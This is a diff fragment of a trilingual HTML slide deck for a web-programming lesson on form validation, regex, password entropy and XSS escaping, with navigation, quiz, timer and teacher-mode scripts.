+      "Начислите баллы за правильные ответы."
+    ],
+    [
+      "Итоги Урока",
+      "Подведите итоги и выдайте домашнее задание.",
+      "Анонсируйте тему NPM и безопасности зависимостей."
+    ]
+  ],
+  "en": [
+    [
+      "Intro & Objectives",
+      "Announce today's topic: interactive forms, Regex syntax, and real-time cyber validation.",
+      "Draw POST reload vs SPA 0ms latency on the board."
+    ],
+    [
+      "Lesson 33 Review",
+      "Explain why hard F5 refreshes triggered 404 errors in naive SPAs without rewrites.",
+      "Reinforce the golden rule of routing fallback to index.html."
+    ],
+    [
+      "Flaws of Classical Forms",
+      "Explain how synchronous page refreshes break user experience.",
+      "Highlight the benefits of e.preventDefault() and the input event."
+    ],
+    [
+      "Regex Syntax",
+      "Break down essential metacharacters (^, $, \\d, \\w, +, {8,}).",
+      "Demonstrate regex testing via RegExp.prototype.test()."
+    ],
+    [
+      "Production Regexes",
+      "Walk through production patterns for email, +998 phone, and secure passwords.",
+      "Explain positive lookahead validation logic."
+    ],
+    [
+      "Password Entropy",
+      "Explain Shannon entropy formula E = L * log2(R).",
+      "Compare brute-force resistance across modern GPU rigs."
+    ],
+    [
+      "XSS Sanitization",
+      "Demonstrate the critical vulnerability of injecting user inputs via innerHTML.",
+      "Guide students on crafting pure HTML escaping utilities."
+    ],
+    [
+      "Smartboard Demo",
+      "Execute the live validation simulator on the smartboard.",
+      "Invite a student to test malicious <script> neutralization."
+    ],
+    [
+      "Quick Quiz",
+      "Conduct the 3-question knowledge check.",
+      "Award participation points to active students."
+    ],
+    [
+      "Summary & Next",
+      "Wrap up the lesson and assign the 3-tier homework.",
+      "Tease the NPM package ecosystem and supply chain security for Lesson 35."
+    ]
+  ]
+};
+
+function updateSlide(skipSync) {
+  slides.forEach(function(s, idx) {
+    s.classList.toggle("is-on", idx === currentSlide);
+  });
+  document.getElementById("currSlide").textContent = currentSlide + 1;
+  
+  var activeSlide = slides[currentSlide];
+  var phaseData = activeSlide.getAttribute("data-phase") || "Dars|Урок|Lesson";
+  var parts = phaseData.split("|");
+  var phaseText = currentLang === "ru" ? (parts[1] || parts[0]) : (currentLang === "en" ? (parts[2] || parts[0]) : parts[0]);
+  document.getElementById("phasePill").textContent = phaseText;
+
+  var noteList = NOTES[currentLang] || NOTES.uz;
+  var triplet = noteList[currentSlide] || ["Izoh", "", ""];
+  document.getElementById("notesContent").innerHTML = "<b>" + triplet[0] + "</b><p style='margin:6px 0;'>“" + triplet[1] + "”</p><small style='color:var(--accent); font-weight:700;'>" + triplet[2] + "</small>";
+
+  if (!skipSync) {
+    syncSlideToURL(false);
+  }
+}
+
+function nextSlide() {
+  if (currentSlide < total - 1) {
+    currentSlide++;
+    syncSlideToURL(true);
+    updateSlide(true);
+  }
+}
+
+function prevSlide() {
+  if (currentSlide > 0) {
+    currentSlide--;
+    syncSlideToURL(true);
+    updateSlide(true);
+  }
+}
+
+function goToSlide(n) {
+  if (n >= 0 && n < total && n !== currentSlide) {
+    currentSlide = n;
+    syncSlideToURL(true);
+    updateSlide(true);
+  }
+}
+
+window.addEventListener("popstate", function(e) {
+  var target = getSlideFromURL();
+  if (target !== currentSlide) {
+    currentSlide = target;
+    updateSlide(true);
+  }
+});
+
+window.addEventListener("hashchange", function() {
+  var target = getSlideFromURL();
+  if (target !== currentSlide) {
+    currentSlide = target;
+    updateSlide(true);
+  }
+});
+
+// In-Place i18n Engine (Zero-Blank Fallback Guarantee)
+function setLang(lang) {
+  currentLang = lang;
+  document.documentElement.setAttribute("lang", lang);
+  document.querySelectorAll(".lang-btn").forEach(function(btn) {
+    btn.classList.toggle("is-active", btn.getAttribute("data-lang") === lang);
+  });
+  
+  var attr = "data-" + lang;
+  var titleAttr = "data-title-" + lang;
+
+  var translatable = document.querySelectorAll("[data-ru], [data-en]");
+  translatable.forEach(function(el) {
+    var isSvgText = (el.tagName && el.tagName.toLowerCase() === "text");
+    if (!el.hasAttribute("data-uz-orig")) {
+      el.setAttribute("data-uz-orig", isSvgText ? el.textContent : el.innerHTML);
+    }
+    var targetVal = (lang === "uz") ? el.getAttribute("data-uz-orig") : (el.getAttribute(attr) || el.getAttribute("data-uz-orig"));
+    if (isSvgText) {
+      el.textContent = targetVal;
+    } else {
+      el.innerHTML = targetVal;
+    }
+  });
+
+  // Also update titles for tooltips
+  var titleElements = document.querySelectorAll("[data-title-ru], [data-title-en]");
+  titleElements.forEach(function(el) {
+    if (!el.hasAttribute("data-title-uz-orig")) {
+      el.setAttribute("data-title-uz-orig", el.getAttribute("title") || "");
+    }
+    if (lang === "uz") {
+      el.setAttribute("title", el.getAttribute("data-title-uz-orig"));
+    } else {
+      var tVal = el.getAttribute(titleAttr);
+      el.setAttribute("title", tVal ? tVal : el.getAttribute("data-title-uz-orig"));
+    }
+  });
+
+  updateSlide(true);
+  try { localStorage.setItem("target_lang", lang); } catch(e) {}
+}
+
+function toggleTheme() {
+  var cur = document.documentElement.getAttribute("data-theme") || "light";
+  var next = cur === "dark" ? "light" : "dark";
+  document.documentElement.setAttribute("data-theme", next);
+  try { localStorage.setItem("target_theme", next); } catch(e) {}
+}
+
+function toggleNotes() {
+  document.getElementById("notesDrawer").classList.toggle("open");
+}
+
+function toggleHelp() {
+  document.getElementById("helpModal").classList.toggle("open");
+}
+
+// Interactive Quiz Logic
+function checkQuiz(btn, isCorrect) {
+  var parent = btn.parentElement;
+  parent.querySelectorAll(".quiz-opt").forEach(function(opt) {
+    opt.classList.remove("correct", "wrong");
+  });
+  if (isCorrect) {
+    btn.classList.add("correct");
+  } else {
+    btn.classList.add("wrong");
+  }
+}
+
+function toggleReveal(btn) {
+  var reveal = btn.nextElementSibling;
+  if (reveal.style.display === "block") {
+    reveal.style.display = "none";
+  } else {
+    reveal.style.display = "block";
+  }
+}
+
+// Practical Timer Logic
+var timerSeconds = 15 * 60;
+var timerInterval = null;
+function toggleTimer() {
+  var btn = document.getElementById("timerBtn");
+  var txt = document.getElementById("timerTxt");
+  if (timerInterval) {
+    clearInterval(timerInterval);
+    timerInterval = null;
+    btn.style.background = "var(--accent)";
+  } else {
+    btn.style.background = "var(--green)";
+    timerInterval = setInterval(function() {
+      if (timerSeconds <= 0) {
+        clearInterval(timerInterval);
+        timerInterval = null;
+        txt.textContent = "00:00 - Vaqt tugadi!";
+        return;
+      }
+      timerSeconds--;
+      var m = Math.floor(timerSeconds / 60);
+      var s = timerSeconds % 60;
+      txt.textContent = (m < 10 ? "0" + m : m) + ":" + (s < 10 ? "0" + s : s);
+    }, 1000);
+  }
+}
+
+// ============================================================
+// PRESENTATION SCALE CONTROLLER (Direct in-deck zoom & Smartboard pinch)
+// ============================================================
+var currentScale = 1.0;
+var MIN_SCALE = 0.6;
+var MAX_SCALE = 1.6;
+
+function setScale(scale) {
+  currentScale = Math.min(MAX_SCALE, Math.max(MIN_SCALE, Math.round(scale * 100) / 100));
+  document.documentElement.style.setProperty("--deck-scale", currentScale);
+  var slidesList = document.querySelectorAll(".slide");
+  slidesList.forEach(function(s) {
+    s.style.zoom = currentScale;
+  });
+  var lbl = document.getElementById("scaleLabel");
+  if (lbl) {
+    lbl.textContent = Math.round(currentScale * 100) + "%";
+  }
+  try { localStorage.setItem("target_scale", currentScale.toString()); } catch(e) {}
+}
+
+function adjustScale(delta) {
+  var next = Math.round((currentScale + delta) * 10) / 10;
+  setScale(next);
+}
+
+function resetScale() {
+  setScale(1.0);
+}
+
+function cycleScale() {
+  var presets = [1.0, 1.15, 1.3, 1.5, 0.85];
+  var next = presets[0];
+  for (var i = 0; i < presets.length; i++) {
+    if (Math.abs(presets[i] - currentScale) < 0.05) {
+      next = presets[(i + 1) % presets.length];
+      break;
+    }
+  }
+  setScale(next);
+}
+
+// Keyboard Navigation
+document.addEventListener("keydown", function(e) {
+  if (e.target.tagName === "INPUT" || e.target.tagName === "TEXTAREA") return;
+  if (e.key === "ArrowRight" || e.key === " ") { e.preventDefault(); nextSlide(); }
+  else if (e.key === "ArrowLeft") { e.preventDefault(); prevSlide(); }
+  else if (e.key === "l" || e.key === "L") {
+    var order = ["uz", "ru", "en"];
+    setLang(order[(order.indexOf(currentLang) + 1) % 3]);
+  } else if (e.key === "t" || e.key === "T") { toggleTheme(); }
+  else if (e.key === "n" || e.key === "N") { toggleNotes(); }
+  else if (e.key === "?" || e.key === "/") { toggleHelp(); }
+  else if (e.key === "+" || e.key === "=") { adjustScale(0.1); }
+  else if (e.key === "-" || e.key === "_") { adjustScale(-0.1); }
+  else if (e.key === "0") { resetScale(); }
+  else if ((e.altKey && (e.key === "s" || e.key === "S")) || (e.ctrlKey && e.shiftKey && (e.key === "s" || e.key === "S"))) {
+    e.preventDefault();
+    toggleTeacherSolutionMode();
+  }
+  else if (e.key === "Escape") {
+    document.getElementById("notesDrawer").classList.remove("open");
+    document.getElementById("helpModal").classList.remove("open");
+  }
+});
+
+// Touch / Swipe Navigation & Smartboard Pinch-to-Zoom
+var touchStartX = 0, touchStartY = 0, touchStartTime = 0;
+var initialPinchDist = 0, pinchStartScale = 1.0;
+
+document.addEventListener("touchstart", function(e) {
+  if (e.touches && e.touches.length === 2) {
+    var dx = e.touches[0].clientX - e.touches[1].clientX;
+    var dy = e.touches[0].clientY - e.touches[1].clientY;
+    initialPinchDist = Math.hypot(dx, dy);
+    pinchStartScale = currentScale;
+  } else if (e.touches && e.touches.length === 1) {
+    touchStartX = e.touches[0].clientX;
+    touchStartY = e.touches[0].clientY;
+    touchStartTime = Date.now();
+  }
+}, { passive: true });
+
+document.addEventListener("touchmove", function(e) {
+  if (e.touches && e.touches.length === 2 && initialPinchDist > 0) {
+    var dx = e.touches[0].clientX - e.touches[1].clientX;
+    var dy = e.touches[0].clientY - e.touches[1].clientY;
+    var dist = Math.hypot(dx, dy);
+    var ratio = dist / initialPinchDist;
+    var targetScale = Math.round(pinchStartScale * ratio * 10) / 10;
+    if (Math.abs(targetScale - currentScale) >= 0.05) {
+      setScale(targetScale);
+    }
+  }
+}, { passive: true });
+
+document.addEventListener("touchend", function(e) {
+  if (e.touches && e.touches.length < 2) {
+    initialPinchDist = 0;
+  }
+  if (e.changedTouches && e.changedTouches.length === 1 && initialPinchDist === 0) {
+    var dx = e.changedTouches[0].clientX - touchStartX;
+    var dy = e.changedTouches[0].clientY - touchStartY;
+    var dt = Date.now() - touchStartTime;
+    if (Math.abs(dx) > 40 && Math.abs(dx) > Math.abs(dy) * 1.3 && dt < 800) {
+      var target = e.target;
+      if (target.closest("input, textarea, select, button, .quiz-box, .code-snippet, .notes-drawer")) return;
+      if (dx < 0) { nextSlide(); } else { prevSlide(); }
+    }
+  }
+}, { passive: true });
+
+// ============================================================
+// SECRET TEACHER SOLUTION CONTROLLER (?sol=1, Alt+S, or Triple-Tap Counter)
+// ============================================================
+var counterTapCount = 0;
+var counterTapTimer = null;
+
+function handleCounterTap() {
+  counterTapCount++;
+  clearTimeout(counterTapTimer);
+  if (counterTapCount >= 3) {
+    counterTapCount = 0;
+    toggleTeacherSolutionMode();
+  } else {
+    counterTapTimer = setTimeout(function() { counterTapCount = 0; }, 700);
+  }
+}
+
+function checkTeacherSolutionMode() {
+  try {
+    var params = new URLSearchParams(window.location.search);
+    var isTeacher = params.has("sol") || params.has("solution") || params.has("teacher") || params.get("mode") === "teacher";
+    if (!isTeacher && sessionStorage.getItem("target_teacher_mode") === "1") {
+      isTeacher = true;
+    }
+    if (isTeacher) {
+      document.documentElement.setAttribute("data-show-solutions", "true");
+    }
+  } catch(e) {}
+}
+
+function toggleTeacherSolutionMode() {
+  var cur = document.documentElement.getAttribute("data-show-solutions") === "true";
+  var next = !cur;
+  document.documentElement.setAttribute("data-show-solutions", next ? "true" : "false");
+  try {
+    sessionStorage.setItem("target_teacher_mode", next ? "1" : "0");
+    var url = new URL(window.location.href);
+    if (next) {
+      url.searchParams.set("sol", "1");
+    } else {
+      url.searchParams.delete("sol");
+      url.searchParams.delete("solution");
+      url.searchParams.delete("teacher");
+      url.searchParams.delete("mode");
+    }
+    history.replaceState(null, "", url.toString());
+  } catch(e) {}
+  showSolutionToast(next);
+}
+
+function showSolutionToast(active) {
+  var toast = document.getElementById("teacherToast");
+  if (!toast) {
+    toast = document.createElement("div");
+    toast.id = "teacherToast";
+    toast.style.cssText = "position:fixed; top:20px; right:20px; z-index:99999; padding:10px 18px; border-radius:10px; font-family:'Manrope',sans-serif; font-size:12.5px; font-weight:800; box-shadow:0 8px 24px rgba(0,0,0,0.3); transition:all 0.3s ease; pointer-events:none;";
+    document.body.appendChild(toast);
+  }
+  if (active) {
+    toast.style.background = "#10B981";
+    toast.style.color = "#FFFFFF";
+    toast.textContent = currentLang === "ru" ? "🔓 Режим учителя: Решения и файлы .sb3 открыты!" : (currentLang === "en" ? "🔓 Teacher Mode: Solutions & .sb3 revealed!" : "🔓 O'qituvchi rejimi: Oltin yechimlar ochildi!");
+  } else {
+    toast.style.background = "#374151";
+    toast.style.color = "#E5E7EB";
+    toast.textContent = currentLang === "ru" ? "🔒 Решения скрыты от учеников" : (currentLang === "en" ? "🔒 Solutions hidden from students" : "🔒 Oltin yechimlar yashirildi");
+  }
+  toast.style.opacity = "1";
+  toast.style.transform = "translateY(0)";
+  setTimeout(function() {
+    toast.style.opacity = "0";
+    toast.style.transform = "translateY(-10px)";
+  }, 2400);
+}
+
+// Lifecycle Init
+function initPresentation() {
+  checkTeacherSolutionMode();
+  var savedTheme = "light";
+  try { savedTheme = localStorage.getItem("target_theme") || "light"; } catch(e) {}
+  document.documentElement.setAttribute("data-theme", savedTheme);
+
+  var savedLang = "uz";
+  try {
+    var initParams = new URLSearchParams(window.location.search);
+    var initLang = initParams.get("lang");
+    savedLang = initLang || localStorage.getItem("target_lang") || "uz";
+  } catch(e) {}
+  setLang(savedLang);
+
+  var savedScale = 1.0;
+  try {
+    var rawScale = localStorage.getItem("target_scale");
+    if (rawScale) savedScale = parseFloat(rawScale);
+  } catch(e) {}
+  if (savedScale && !isNaN(savedScale) && savedScale >= MIN_SCALE && savedScale <= MAX_SCALE) {
+    setScale(savedScale);
+  } else {
+    setScale(1.0);
+  }
+
+  currentSlide = getSlideFromURL();
+  updateSlide(true);
+  syncSlideToURL(false);
+}
+
+if (document.readyState === "loading") {
+  window.addEventListener("DOMContentLoaded", initPresentation);
+} else {
+  initPresentation();
+}
+</script>
+<script>
+
+function testDemoEmail() {
+  var inp = document.getElementById('demoEmail');
+  var st = document.getElementById('demoEmailStatus');
+  var regex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+  if (!inp.value) {
+    st.textContent = 'Email kiriting...';
+    st.style.color = '#64748b';
+  } else if (regex.test(inp.value)) {
+    st.textContent = '✅ To‘g‘ri formatdagi email!';
+    st.style.color = '#10b981';
+  } else {
+    st.textContent = '❌ Noto‘g‘ri email (@ va domen kerak)';
+    st.style.color = '#ef4444';
+  }
+}
+
+function testDemoPassword() {
+  var inp = document.getElementById('demoPass');
+  var val = inp.value;
+  var bar = document.getElementById('demoEntropyBar');
+  var st = document.getElementById('demoPassStatus');
+  var out = document.getElementById('demoSanitizedOutput');
+
+  // Compute character pool
+  var pool = 0;
+  if (/[a-z]/.test(val)) pool += 26;
+  if (/[A-Z]/.test(val)) pool += 26;
+  if (/\d/.test(val)) pool += 10;
+  if (/[^a-zA-Z0-9]/.test(val)) pool += 32;
+
+  var entropy = 0;
+  if (pool > 0 && val.length > 0) {
+    entropy = Math.round(val.length * (Math.log(pool) / Math.log(2)));
+  }
+
+  // Update entropy UI
+  var pct = Math.min(100, Math.round((entropy / 80) * 100));
+  bar.style.width = pct + '%';
+
+  if (entropy === 0) {
+    bar.style.background = '#ef4444';
+    st.textContent = 'Entropiya: 0 bit (Bo‘sh)';
+    st.style.color = '#64748b';
+  } else if (entropy < 40) {
+    bar.style.background = '#ef4444';
+    st.textContent = 'Entropiya: ' + entropy + ' bit (Juda zaif!)';
+    st.style.color = '#ef4444';
+  } else if (entropy < 60) {
+    bar.style.background = '#eab308';
+    st.textContent = 'Entropiya: ' + entropy + ' bit (O‘rtacha)';
+    st.style.color = '#eab308';
+  } else {
+    bar.style.background = '#10b981';
+    st.textContent = 'Entropiya: ' + entropy + ' bit (Kiber-Mustahkam ✅)';
+    st.style.color = '#10b981';
+  }
+
+  // Live sanitization output
+  var map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#x27;', '/': '&#x2F;' };
+  var sanitized = val.replace(/[&<>"'/]/g, function(s) { return map[s]; });
+  out.textContent = sanitized || 'Tozalangan matn shu yerda chiqadi...';
+}
+
+</script>
+</body>
+</html>
